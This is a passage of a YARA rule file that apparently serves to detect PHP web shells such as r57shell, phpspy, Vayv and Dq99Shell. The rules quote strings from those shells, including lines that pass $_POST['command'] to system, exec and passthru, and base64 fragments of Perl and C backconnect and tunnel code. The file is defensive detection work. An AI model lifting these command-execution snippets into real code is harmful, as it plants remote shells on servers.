      $s8 = "@mysql_query(\"DROP TABLE IF EXISTS temp_r57_table\");" fullword ascii
      $s9 = "document.getElementById(id).style.display = \\'none\\';" fullword ascii
      $s10 = "cmVtb3RlX3BvcnQpID09IDApIHsKY2xvc2UgKFNFU1NJT04pOwpuZXh0Owp9CnByaW50IFJFTU9URSAkZmlyc3Q7CnByaW50IFJFTU9URSAiVXNlci1" fullword ascii
      $s11 = "echo @htmlspecialchars($filedump);" fullword ascii
      $s12 = "b3RlX2hvc3QpIHsKY2xvc2UoU0VTU0lPTik7CmV4aXQ7Cn0KJHJlbW90ZV9wb3J0ID0gImh0dHAiIHVubGVzcyAoJHJlbW90ZV9wb3J0KTsKJGZpcnN" fullword ascii
      $s13 = "luYW1lKCd0Y3AnKTsKbXkgJG15X2FkZHIgID0gc29ja2FkZHJfaW4gKCRwb3J0LCBJTkFERFJfQU5ZKTsKc29ja2V0IChTT0NLLCBBRl9JTkVULCBTT" fullword ascii
      $s14 = "AoMSkgewpuZXh0IHVubGVzcyBteSAkcmVtb3RlX2FkZHIgPSBhY2NlcHQgKFNFU1NJT04sIFNPQ0spOwpteSAoJGZpc3QsICRtZXRob2QsICRyZW1vd" fullword ascii
      $s15 = "BZ2VudDogR29vZ2xlYm90LzIuMSAoK2h0dHA6Ly93d3cuZ29vZ2xlLmNvbS9ib3QuaHRtbClcbiI7CndoaWxlICg8U0VTU0lPTj4pIHsKbmV4dCBpZi" fullword ascii
      $s16 = "9wZW5fY29ubmVjdGlvbiB7Cm15ICgkaG9zdCwgJHBvcnQpID0gQF9bMSwyXTsKbXkgKCRkZXN0X2FkZHIsICRjdXIpOwppZiAoJHBvcnQgIX4gL15cZ" fullword ascii
      $s17 = "TsKfQpwcmludCBSRU1PVEUgIlxuIjsKJGhlYWRlciA9IDE7CndoaWxlICg8UkVNT1RFPikgewpwcmludCBTRVNTSU9OICRfOwppZiAoJGhlYWRlcikg" fullword ascii
      $s18 = "aW5ldF9hdG9uICgkaG9zdCkgb3IgcmV0dXJuIDA7CiRkZXN0X2FkZHIgPSBzb2NrYWRkcl9pbiAoJHBvcnQsICRob3N0KTsKc29ja2V0ICgkX1swXSw" fullword ascii
      $s19 = "DSywgU09NQVhDT05OKSBvciBkaWUgImxpc3RlbigpOiAkISI7CiRTSUd7J0lOVCd9ID0gc3ViIHsKY2xvc2UgKFNPQ0spOwpleGl0Owp9Owp3aGlsZS" fullword ascii
      $s20 = "CRyZW1vdGVfaG9zdCwgJHJlbW90ZV9wb3J0KSA9IAooJGZpcnN0ID1+IG0hKEdFVCkgaHR0cDovLyhbXi86XSspOj8oXGQqKSEgKTsKaWYgKCEkcmVt" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x0a0a ) and filesize < 900KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _PHkVayv_PHVayv_PH_Vayv_PH_Vdayv_19
{
   meta:
      description = "php22 - from files PHkVayv.php, PHVayv.php, PH_Vayv.php, PH_Vdayv.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3c9b4a962ecc4545922cf9055fbed2b85d91ff8b7f29db40fbf903bef69f8836"
      hash2 = "2f1eb3815669593696f87abcb418c84e8d0708c3831e11a49772a2030f9e5738"
      hash3 = "79ea4abb65d7a5cdaac51f044ad2ff61d9e71f75fe8f475cf360e59eece0ccea"
      hash4 = "4012fe772b284c1d1aa4ed41767230109b725df8e9e39580774663b270c83b1a"
   strings:
      $s1 = "<img border=\"0\" src=\"http://www.aventgrup.net/avlog.gif\"></td>" fullword ascii
      $s2 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/2.gif\"></td>" fullword ascii
      $s3 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/1.gif\"></td>" fullword ascii
      $s4 = "00000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left\"" fullword ascii
      $s5 = "<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse: collapse\" bordercolor=\"#111111\" width=\"100" fullword ascii
      $s6 = "000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left\"" fullword ascii
      $s7 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-CENTER: #000000 1px inset; BORDER-RIGHT: #0" fullword ascii
      $s8 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000" fullword ascii
      $s9 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT" fullword ascii
      $s10 = "<meta http-equiv=\"Content-Language\" content=\"tr\">" fullword ascii
      $s11 = "<a href=\"http://www.aventgrup.net\" style=\"text-decoration: none\">" fullword ascii
      $s12 = "set; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center\"" fullword ascii
      $s13 = "<a href=\"mailto:shopen@aventgrup.net\" style=\"text-decoration: none\">" fullword ascii
      $s14 = "<meta name=\"GENERATOR\" content=\"Microsoft FrontPage 5.0\">" fullword ascii
      $s15 = "<p align=\"center\"><b><font face=\"Verdana, Arial, Helvetica, sans-serif\" size=\"2\" color=\"#000000\" bgcolor=\"Red\"> " fullword ascii
      $s16 = "<font face=\"Verdana\" style=\"font-size: 8pt; font-weight: 700\" color=\"#9F9F9F\">" fullword ascii
      $s17 = "<font face=\"Arial Narrow\" style=\"font-size: 8pt\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   ( XXX )&nbsp;</font></td>" fullword ascii
      $s18 = "</font></span><font face=\"Verdana\" style=\"font-size: 8pt\" color=\"#858585\">" fullword ascii
      $s19 = "<td width=\"625\" bgcolor=\"#000000\"><span style=\"font-size: 2pt\">&nbsp;</span></td>" fullword ascii
      $s20 = "<font face=\"Verdana\" style=\"font-size: 8pt; font-weight: 700\">&nbsp;Dosya " fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 70KB and ( 8 of them )
      ) or ( all of them )
}

rule _phpspy_2009MSSQL_phpspy2009withMSSQL_20
{
   meta:
      description = "php22 - from files phpspy-2009MSSQL.php, phpspy2009withMSSQL.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5cfb62e3f564c3ddbfc77d978ae422d455a1862683e72754492683ad4e1c0ee2"
      hash2 = "c5692bd52a09abd2d2fd3c4de5ac4ddda3923ae855899f0ddf912d9862843f89"
   strings:
      $x1 = "Copyright (C) 2004-2009 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights Reserved." fullword ascii
      $s2 = "join sysusers on sysobjects.uid = sysusers.uid where sysobjects.xtype = 'U' order by sysobjects.name asc\");" fullword ascii
      $s3 = "<td><span style=\"float:right;\"><a href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y')" ascii
      $s4 = "$query = msq(\"SELECT name FROM master.dbo.sysdatabases WHERE has_dbaccess(name) = 1 ORDER BY name\");" fullword ascii
      $s5 = "p('<td><a href=\"javascript:settable(\\''.$table['owner'].'.'.$table['name'].'\\');\">'.$table['name'].'</a></td>');" fullword ascii
      $s6 = "if ($_COOKIE['loginpass'] != $admin['pass']) {" fullword ascii
      $s7 = "18 left join syscomments d on d.id = b.cdefault where a.id = OBJECT_ID('$tablename') order by b.colid\");" fullword ascii
      $s8 = "m(msq(\"INSERT INTO $tablename ($keystr) VALUES ($valstr)\") ? 'Insert new record of success' : msmsg());" fullword ascii
      $s9 = "scookie('loginpass', md5($password));" fullword ascii
      $s10 = "p('<td>Last log backup</td><td>'.$info['JournalBupDate'].'&nbsp;</td>');" fullword ascii
      $s11 = "toval'] ? '<b> - Auto</b>' : '').'</span></td>');" fullword ascii
      $s12 = "$result = msq(\"SELECT t1.owner, t1.crdate, t1.size, t2.DBBupDate, t3.DifBupDate, t4.JournalBupDate FROM (SELECT d.name, suser_s" ascii
      $s13 = "m('Deleted file have finished,choose '.count($dl).' success '.$succ.' fail '.$fail);" fullword ascii
      $s14 = "r: 2009 Build 20081222</a></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>" ascii
      $s15 = "p(\"<tr class=\\\"\".bg().\"\\\"><td colspan=\\\"\".($highver ? 9 : 7).\"\\\"><input name=\\\"saveasfile\\\" value=\\\"1\\\" typ" ascii
      $s16 = "msdbconn($dbhost,$dbuser,$dbpass,$dbname);" fullword ascii
      $s17 = "\"'.$dir.'\" type=\"hidden\" /><input name=\"dir\" value=\"'.$dir.'\" type=\"hidden\" /></div></form>');" fullword ascii
      $s18 = "msdbconn($dbhost, $dbuser, $dbpass, $dbname);" fullword ascii
      $s19 = "if ($admin['pass'] == md5($password)) {" fullword ascii
      $s20 = "$result = msq(\"EXEC sp_helpfile\");" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _phpspy2011_picconf_21
{
   meta:
      description = "php22 - from files phpspy2011.php, picconf.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a2f9b4e1dcf40053915fc68b554cfeae59ebfc71464f1c4cbab05e9456b0762a"
      hash2 = "828e13e143dc50bcde769128772066e303c7fdb10da81f9b6090978e9b4fbb82"
   strings:
      $s1 = "q(\"SET character_set_connection=$charset, character_set_results=$charset, character_set_client=binary;\", $link);" fullword ascii
      $s2 = "if(!$link = @mysql_connect($dbhost.':'.$dbport, $dbuser, $dbpass)) {" fullword ascii
      $s3 = "if( $mode & 0x800 ) {$owner['execute'] = ($owner['execute']=='x') ? 's' : 'S';}" fullword ascii
      $s4 = "if( $mode & 0x200 ) {$world['execute'] = ($world['execute']=='x') ? 't' : 'T';}" fullword ascii
      $s5 = "if( $mode & 0x400 ) {$group['execute'] = ($group['execute']=='x') ? 's' : 'S';}" fullword ascii
      $s6 = "$arg['target'] = $arg['target'] ? \"target=\\\"$arg[target]\\\"\" : '';" fullword ascii
      $s7 = "echo 'Processed in '.$totaltime.' second(s)';" fullword ascii
      $s8 = "$owner['execute'] = ($mode & 00100) ? 'x' : '-'; " fullword ascii
      $s9 = "$world['execute'] = ($mode & 00001) ? 'x' : '-'; " fullword ascii
      $s10 = "$group['execute'] = ($mode & 00010) ? 'x' : '-'; " fullword ascii
      $s11 = "$content = str_replace(\"\\t\", \"&nbsp;&nbsp;&nbsp;&nbsp;\", $content);" fullword ascii
      $s12 = "orld['write'].$world['execute'];" fullword ascii
      $s13 = "function getPath($scriptpath, $nowpath) {" fullword ascii
      $s14 = "$content = str_replace(\"  \", \"&nbsp;&nbsp;\", $content);" fullword ascii
      $s15 = "$array = @posix_getpwuid(@fileowner($filepath));" fullword ascii
      $s16 = "function getUser($filepath)" fullword ascii
      $s17 = "$content = str_replace(\"\\n\", \"<br />\", $content);" fullword ascii
      $s18 = "p(\"<input id=\\\"$name\\\" type=\\\"hidden\\\" name=\\\"$name\\\" value=\\\"$value\\\" />\");" fullword ascii
      $s19 = "!$arg['method'] && $arg['method'] = 'post';" fullword ascii
      $s20 = "if($link && mysql_get_server_info() > '4.1') {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _PHPSPY_PhpSpyVer2006_phpspy_2005_full_phpspy_2005_lite_phpspy_2006_PhpSpy_Ver_2006_22
{
   meta:
      description = "php22 - from files PHPSPY.php, PhpSpyVer2006.php, phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, PhpSpy_Ver_2006.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e349d8a219a43f3dd1339ec5ca39764956401f3820b5000fe25ff18845edff29"
      hash2 = "cdb2650f3e0f6e7e2bc112329f142c9171c953ba62f849f3f16a0f65ec9a8e6f"
      hash3 = "c2b377ee1e465ed9acba15789b866d1a9a39b8880380367376332135e806a067"
      hash4 = "5e358c2385ce5ffcab0797dd1767ca9d55747bf834191d0afe12f17eb7e1428d"
      hash5 = "b0a12e6daee4649ae1ee375c6b6fde658add204d0d521bc208906385d83036e3"
      hash6 = "b0dcae77eabc407c53c0b2b6fe74d0749bc2fa4fd9a560b40400a64d2959492c"
   strings:
      $s1 = "$result=shell_exec($_POST['command']);" fullword ascii
      $s2 = "$result = exec($_POST['command']);" fullword ascii
      $s3 = "if (@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname)) {" fullword ascii
      $s4 = "header('Content-Description: PHP Generated Data');" fullword ascii
      $s5 = "echo \"Processed in $totaltime second(s)\";" fullword ascii
      $s6 = "if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == \"dir\")) {" fullword ascii
      $s7 = "} elseif ($execfunc==\"passthru\") {" fullword ascii
      $s8 = "header('Content-Length: '.filesize($downfile));" fullword ascii
      $s9 = "if ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == \"$key\")) {" fullword ascii
      $s10 = "elseif ($_GET['action'] == \"shell\") {" fullword ascii
      $s11 = "if ($_GET['action'] == \"logout\") {" fullword ascii
      $s12 = "} elseif ($execfunc==\"shell_exec\") {" fullword ascii
      $s13 = "<td align=\"center\"><textarea name=\"textarea\" cols=\"100\" rows=\"25\" readonly><?php" fullword ascii
      $s14 = "passthru($_POST['command']);" fullword ascii
      $s15 = "system($_POST['command']);" fullword ascii
      $s16 = "} elseif ($execfunc==\"popen\") {" fullword ascii
      $s17 = "</a> | <a href=\\\"?action=editfile&dir=\".urlencode($dir).\"&editfile=\".urlencode($file).\"\\\">" fullword ascii
      $s18 = "if ($fp = @fopen(\"$dir/test.txt\", 'w')) {" fullword ascii
      $s19 = "if (!empty($_POST['command'])) {" fullword ascii
      $s20 = "$pp = popen($_POST['command'], 'r');" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57__15__r57_r577_r57shell127_r57_1php_r57_4_r57_iFX_r57_kartal_23
{
   meta:
      description = "php22 - from files r57 (15).php, r57.php, r577.php, r57shell127.php, r57_1php.php, r57_4.php, r57_iFX.php, r57_kartal.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ffca7aeeab1e56ff8010a15f1511e8bcea90cfdcc84248e18d53dacde04cf08b"
      hash2 = "1b92b1abcca09ac8d7d4d3b3c05e4decec11a31e4b71157305979e67df63bc7f"
      hash3 = "93b5f77fcdd31be1a1384c2a942514e83bc5788b523e544b093ae0e56fe9561a"
      hash4 = "9a4f47269ef5fc12c128532307d33ff528b0445929acbeff19148e8cf69456b8"
      hash5 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash6 = "63449c64a6d8b823c39a6b18998534f14492793a324f10d65179431d1c94a30f"
      hash7 = "c4dadade5cd680bd6ac7ba5854d65b751feccc5c3a2300c69c3a7965b6c1d5ef"
      hash8 = "8113587c0c5860fb6c1fe2cc2fd610cde85b28ffa1d5fdee1ef26b956c382894"
   strings:
      $x1 = "$sql1  = \"# PostgreSQL dump created by r57shell\\r\\n\";" fullword ascii
      $s2 = "$sql1  = \"# MSSQL dump created by r57shell\\r\\n\";" fullword ascii
      $s3 = "$db = @ocilogon($_POST['mysql_l'], $_POST['mysql_p'], $_POST['mysql_db']);" fullword ascii
      $s4 = "$sql2 .= \"INSERT INTO \".$_POST['mysql_tbl'].\" (\".$keys.\") VALUES ('\".htmlspecialchars($values).\"');\\r\\n\";" fullword ascii
      $s5 = "$sql2 .= \"INSERT INTO `\".$_POST['mysql_tbl'].\"` (`\".$keys.\"`) VALUES ('\".htmlspecialchars($values).\"');\\r\\n\";" fullword ascii
      $s6 = "echo sr(45,\"<b>\".$lang[$language.'_text84'].$arrow.\"</b>\".in('hidden','dir',0,$dir).in('hidden','cmd',0,'db_query'),\"\");" fullword ascii
      $s7 = "/* else { if(($rows = @mssql_affected_rows($db)) > 0) { echo \"<table width=100%><tr><td><font face=Verdana size=-2>affecte" fullword ascii
      $s8 = "if($error) { echo \"<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>\".$error.\"</b></font></td></tr></table>" fullword ascii
      $s9 = "if(($error = @ocierror())) { echo \"<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>\".$error['message'].\"</b>" fullword ascii
      $s10 = "echo sr(45,\"<b>\".$lang[$language.'_text59'].$arrow.\"</b>\",in('text','dif_name',15,(!empty($_POST['dif_name'])?($_POST['dif_n" ascii
      $s11 = "$res=@pg_query($db,\"SELECT datname FROM pg_database WHERE datistemplate='f'\");" fullword ascii
      $s12 = "$res = @mssql_query(\"SELECT * FROM \".$_POST['mysql_tbl'].\"\", $db);" fullword ascii
      $s13 = "$res = @pg_query($db,\"SELECT * FROM \".$_POST['mysql_tbl'].\"\");" fullword ascii
      $s14 = "$str = \"host='localhost' port='\".$_POST['db_port'].\"' user='\".$_POST['mysql_l'].\"' password='\".$_POST['mysql_p'].\"' dbnam" ascii
      $s15 = "$str = \"host='localhost' port='\".$_POST['db_port'].\"' user='\".$_POST['mysql_l'].\"' password='\".$_POST['mysql_p'].\"' dbnam" ascii
      $s16 = "else echo \"<div align=center><font face=Verdana size=-2 color=red><b>Can't connect to PostgreSQL server</b></font></div>\";" fullword ascii
      $s17 = "@ociexecute($stat);" fullword ascii
      $s18 = "for ($j = 1; $j <= @ocinumcols($stat); $j++) { echo \"<td><font face=Verdana size=-2>&nbsp;\".htmlspecialchars(@ociresult($s" fullword ascii
      $s19 = "]):(\"dump.sql\"))));" fullword ascii
      $s20 = "if($rowcount != 0) {echo \"<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>\".$rowcount.\"</b></font><" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _mpdf_mpdf_24
{
   meta:
      description = "php22 - from files mpdf.php, mpdf.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a4af3ce4aec470e4c5bc24c43932ca153111f1cdb0c02cfac70840cd76be6162"
      hash2 = "a4af3ce4aec470e4c5bc24c43932ca153111f1cdb0c02cfac70840cd76be6162"
   strings:
      $s1 = "$tempfile = _MPDF_TEMP_PATH.'_tempImgPNG'.md5($file).RAND(1,10000).'.png';" fullword ascii
      $s2 = "$blt_width = $this->GetStringWidth(str_repeat('5',strlen($maxnum)).$this->list_number_suffix);" fullword ascii
      $s3 = "if (isset($table['thead-underline']) && $table['thead-underline']) {" fullword ascii
      $s4 = "$content[$k] = $chunk = str_replace(chr(173),'',$chunk );" fullword ascii
      $s5 = "$halfspaceT = $table['padding']['T'] + ($table['border_spacing_V']/2);" fullword ascii
      $s6 = "else if (isset($properties['MARGIN-RIGHT']) && strtolower($properties['MARGIN-RIGHT'])=='auto') { " fullword ascii
      $s7 = "for( $j = $startcol ; $j < $numcols ; $j++ ) { //Columns" fullword ascii
      $s8 = "$img_w = $w - $extraWidth ;" fullword ascii
      $s9 = "if ($type == 'annot' || $type == 'bookmark' || $type == 'indexentry' || $type == 'toc') {" fullword ascii
      $s10 = "$nc = $this->_darkenColor($details[$side]['c']);" fullword ascii
      $s11 = "$firstblockfill = $this->GetFirstBlockFill();" fullword ascii
      $s12 = "if (!class_exists('TTFontFile', false)) { include(_MPDF_PATH .'classes/ttfontsuni.php'); }" fullword ascii
      $s13 = "if (isset($cell['colspan']) && $cell['colspan']>1) { $ccolsp = $cell['colspan']; }" fullword ascii
      $s14 = "if (isset($this->columnForms[$s['col']][INTVAL($s['x'])][INTVAL($s['y'])])) {" fullword ascii
      $s15 = "if (isset($this->columnLinks[$s['col']][INTVAL($s['x'])][INTVAL($s['y'])])) {" fullword ascii
      $s16 = "foreach($this->columnbuffer AS $key=>$s) { " fullword ascii
      $s17 = "foreach($this->internallink AS $key => $f) {" fullword ascii
      $s18 = "//Check if it is the last element. If so then finish printing the block" fullword ascii
      $s19 = "$currblk['margin_left'] = $prevblk['inner_width'] - ($currblk['css_set_width'] + $currblk['border_left']['w'] + $currblk['paddin" ascii
      $s20 = "$this->SetLineHeight('',$this->table[1][1]['cellLineHeight']);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 4000KB and ( 8 of them )
      ) or ( all of them )
}

rule _R0XEM_ShElL_r57__15__r57_bd_r57_r577_r57shell_r57shell1_40_r57shell127_r57shell2_0_r57Shell_0de93ccddbeddbea5954e4dacb37a6a_25
{
   meta:
      description = "php22 - from files R0XEM_ShElL.php, r57 (15).php, r57-bd.php, r57.php, r577.php, r57shell.php, r57shell1.40.php, r57shell127.php, r57shell2.0.php, r57Shell_0de93ccddbeddbea5954e4dacb37a6a9d343c1b3.php, r57Shell_0fa5df7bbf035cb307867a5b5e783abfb0158976.php, r57Shell_a5f8c9622eaae6ad40454b3605c37b10483c836b.php, r57Shell_b16fdf4a3fc21892dcf5f69f802dbd928642b5a4.php, r57shell_v.1.42_edited_by_kibngdefacer.php, r57_1php.php, r57_4.php, r57_iFX.php, r57_kartal.php, r57_Mohajer22.php, r57_Shell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f74780a5550f4cdfd0298caf88c460076a9861638bad518a27773f61da27d53d"
      hash2 = "ffca7aeeab1e56ff8010a15f1511e8bcea90cfdcc84248e18d53dacde04cf08b"
      hash3 = "4adf0f6edf2981d489a3401b0327bba8e0f1f039bc8b23f884054bc6740376a9"
      hash4 = "1b92b1abcca09ac8d7d4d3b3c05e4decec11a31e4b71157305979e67df63bc7f"
      hash5 = "93b5f77fcdd31be1a1384c2a942514e83bc5788b523e544b093ae0e56fe9561a"
      hash6 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash7 = "b5ae25fc5a43fc95297ee6477b18e3c44dbdafca5ba424c24a9680a8560a8ba1"
      hash8 = "9a4f47269ef5fc12c128532307d33ff528b0445929acbeff19148e8cf69456b8"
      hash9 = "20ccd077d37e8789dd9ed08fb9d126547c2b16715d9891d90ebf8f9372c323e7"
      hash10 = "c567ec472c68a604d58bd14864487871556bcff7c26b9640b3bf032955e7dddc"
      hash11 = "b54be385d814a2deefc5f788255c6f58fffc7855d8d530b937679eec2eabcf14"
      hash12 = "6b2de11c6a60289616c2fc9ea44cc0c70dc0f19dac7cd85767e05aef42833d2d"
      hash13 = "71a6b712bed415a8bbfc02e006904d63dca15e0c778f607888e776bc9df700db"
      hash14 = "3e1130a845de93c4e43de5470e9c28eb09a31edf2c6fdb9f0f05e303eae8d228"
      hash15 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash16 = "63449c64a6d8b823c39a6b18998534f14492793a324f10d65179431d1c94a30f"
      hash17 = "c4dadade5cd680bd6ac7ba5854d65b751feccc5c3a2300c69c3a7965b6c1d5ef"
      hash18 = "8113587c0c5860fb6c1fe2cc2fd610cde85b28ffa1d5fdee1ef26b956c382894"
      hash19 = "a5127bc0ac6c8ec4c570ca8763be7f6cc051338f418ccef777542e05824cb16a"
      hash20 = "d0819e45f7c6acf3bd0b8dcf49ee4f3ba4edd152038a84043752eea3f04afa39"
   strings:
      $s1 = "bW9uKXsgJHBpZCA9IGZvcms7IGV4aXQgaWYgJHBpZDsgZGllICIkISIgdW5sZXNzIGRlZmluZWQoJHBpZCk7IFBPU0lYOjpzZXRzaWQoKSBvciBkaWU" fullword ascii
      $s2 = "xpc3RbZXJyb3JdOw0KfQ0KI2VuZGlmDQoNCm1haW4oYXJnYywgYXJndikgIA0KICBpbnQgYXJnYzsgIA0KICBjaGFyICoqYXJndjsgIA0KeyANCiAga" fullword ascii
      $s3 = "0KDQogIGlmIChhcmdjICE9IDQpIHsNCiAgICBmcHJpbnRmKHN0ZGVyciwiVXNhZ2U6ICVzIGxvY2FscG9ydCByZW1vdGVwb3J0IHJlbW90ZWhvc3Rcb" fullword ascii
      $s4 = "lcnJvcihlcnJvcikgIA0KaW50IGVycm9yOyAgDQp7IA0KaWYgKGVycm9yID4gc3lzX25lcnIpDQpyZXR1cm4gdW5kZWY7DQpyZXR1cm4gc3lzX2Vycm" fullword ascii
      $s5 = "IHt9DQpteSAkY2J1ZmZlciA9ICIiOw0KbXkgJHRidWZmZXIgPSAiIjsNCmlmICgkY2ggJiYgKHZlYygkZW91dCwgZmlsZW5vKCRjaCksIDEpIHx8IHZ" fullword ascii
      $s6 = "x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jb" fullword ascii
      $s7 = "HVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxsaW51eC90aW1lLmg+DQojaWZkZWYgU1RSRVJST1INCmV4dGVybiBj" fullword ascii
      $s8 = "MDsNCg0KIGdvdHNvY2s6DQogIGlmICgob3NvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNCiA" fullword ascii
      $s9 = "yIGRpZSAiJCEiOyB9DQokY2gtPmF1dG9mbHVzaCgpOw0KJHRoLT5hdXRvZmx1c2goKTsNCndoaWxlICgkY2ggfHwgJHRoKSB7DQpteSAkcmluID0gIi" fullword ascii
      $s10 = "hhdG9sKGFyZ3ZbMV0pKSk7DQogIGlmICgobHNvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNC" fullword ascii
      $s11 = "CmlmICgkby0+eydkaXInfSkgeyAkZmggPSBTeW1ib2w6OmdlbnN5bSgpOyBvcGVuKCRmaCwgIj4kby0+eydkaXInfS90dW5uZWwkbnVtLmxvZyIpIG9" fullword ascii
      $s12 = "NvY2tldDo6SU5FVC0+bmV3KCdMb2NhbFBvcnQnID0+ICRsb2NhbHBvcnQsJ1JldXNlJyA9PiAxLCdMaXN0ZW4nID0+IDEwKSB8fCBkaWUgIiQhIjsNC" fullword ascii
      $s13 = "aGFyICpzeXNfZXJybGlzdFtdOw0KZXh0ZXJuIGludCBzeXNfbmVycjsNCmNoYXIgKnVuZGVmID0gIlVuZGVmaW5lZCBlcnJvciI7DQpjaGFyICpzdHJ" fullword ascii
      $s14 = "aW50IFNUREVSUiAiJCFcbiI7IG5leHQ7IH0NCisrJG51bTsNCiRwaWQgPSBmb3JrKCk7DQppZiAoIWRlZmluZWQoJHBpZCkpIHsgcHJpbnQgU1RERVJ" fullword ascii
      $s15 = "gIiQhIjsgfQ0KJW8gPSAoJ3BvcnQnID0+ICRsb2NhbHBvcnQsJ3RvcG9ydCcgPT4gJHBvcnQsJ3RvaG9zdCcgPT4gJGhvc3QpOw0KJGFoID0gSU86Ol" fullword ascii
      $s16 = "LCBjYWRkciwgb2FkZHI7DQogIGludCBjYWRkcmxlbiA9IHNpemVvZihjYWRkcik7DQogIGZkX3NldCBmZHNyLCBmZHNlOw0KICBzdHJ1Y3QgaG9zdGV" fullword ascii
      $s17 = "W50IGxzb2NrLCBjc29jaywgb3NvY2s7DQogIEZJTEUgKmNmaWxlOw0KICBjaGFyIGJ1Zls0MDk2XTsNCiAgc3RydWN0IHNvY2thZGRyX2luIGxhZGRy" fullword ascii
      $s18 = "WRkcicgPT4gJG8tPnsndG9ob3N0J30sJ1BlZXJQb3J0JyA9PiAkby0+eyd0b3BvcnQnfSk7DQppZiAoISR0aCkgeyBleGl0IDA7IH0NCm15ICRmaDsN" fullword ascii
      $s19 = "gIGNsb3NlKG9zb2NrKTsNCiBxdWl0MToNCiAgZmZsdXNoKGNmaWxlKTsNCiAgc2h1dGRvd24oY3NvY2ssMik7DQogcXVpdDA6DQogIGZjbG9zZShjZm" fullword ascii
      $s20 = "DApIHskdGJ1ZmZlciA9IHN1YnN0cigkdGJ1ZmZlciwgJHJlcyk7fSANCmVsc2Uge3ByaW50IFNUREVSUiAiJCFcbiI7fQ0KfQ0Kd2hpbGUgKG15ICRs" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x0a0a or uint16(0) == 0x3c0a ) and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _oi_php_decode_r57_biz_Dq99Shell_26
{
   meta:
      description = "php22 - from files oi.php.decode.php, r57.biz_Dq99Shell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9978ea2bdfbadad460a3871b5a357cc25342820808536cb3fb652f2324df2dfb"
      hash2 = "80750b669b03b8ee93e0591222c940cb875a3feadf7f7aedda0e56f68fb6b240"
   strings:
      $x1 = "exit(\"<a href=\\\"$sh_mainurl\\\">$sh_name</a>: Access Denied - Your host (\".getenv(\"REMOTE_ADDR\").\") not allowed\");" fullword ascii
      $x2 = "array(\"Md5-Lookup\",\"http://darkc0de.com/database/md5lookup.html\")," fullword ascii
      $s3 = "return \"http://milw0rm.com/search.php?dong=Linux Kernel \".$Lversion;" fullword ascii
      $s4 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {" fullword ascii
